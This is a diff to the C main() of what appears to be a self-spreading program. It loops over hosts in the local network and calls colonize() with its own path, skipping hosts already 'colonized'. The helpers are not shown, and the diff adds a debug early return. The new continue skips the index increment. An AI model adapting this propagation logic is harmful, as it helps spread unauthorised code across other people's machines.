@@ -1,17 +1,19 @@
 #include "../include/main.h"
 
 int main (int argc, char **argv) {
+	int i = 0;
+	char path[PATH_MAX];
+	struct in_addr srcHost;
+	char *program_name = NULL;
 	char *dir_name = NULL;
 	char *source_host_ip = NULL;
 	char *mask_network = NULL;
 	char *control_file = NULL;
 	char *command_file = NULL;
-	int i = 0;
-	char program[PATH_MAX];
 	struct in_addr *hostList = NULL;
-	struct in_addr srcHost;
 
-	realpath(argv[0], program);
+	realpath(argv[0], path);
+	program_name = basename(argv[0]);
 	dir_name = dirname(argv[0]);
 	chdir(dir_name);
 
@@ -22,6 +24,8 @@ int main (int argc, char **argv) {
 		if (source_host_ip == NULL || mask_network == NULL)
 			return EXIT_FAILURE;
 
+		printf("isSrcHost : %d\n", isSourceHost(source_host_ip, mask_network));
+		return 0;
 		if(isSourceHost(source_host_ip, mask_network)) {
 			control_file = GetConfigControl();
 			command_file = GetConfigCommand();
@@ -30,8 +34,14 @@ int main (int argc, char **argv) {
 
 			while (1) {
 				if (inet_netof(hostList[i]) == inet_netof(srcHost)) {
-					colonize(inet_ntoa(hostList[i]), program);
+					if (isAlreadyColonize(inet_ntoa(hostList[i]), program_name))
+						continue;
+					else
+						colonize(inet_ntoa(hostList[i]), path);
 				}
+				else
+					break;
+				i++;
 			}
 		}
 		free(source_host_ip);
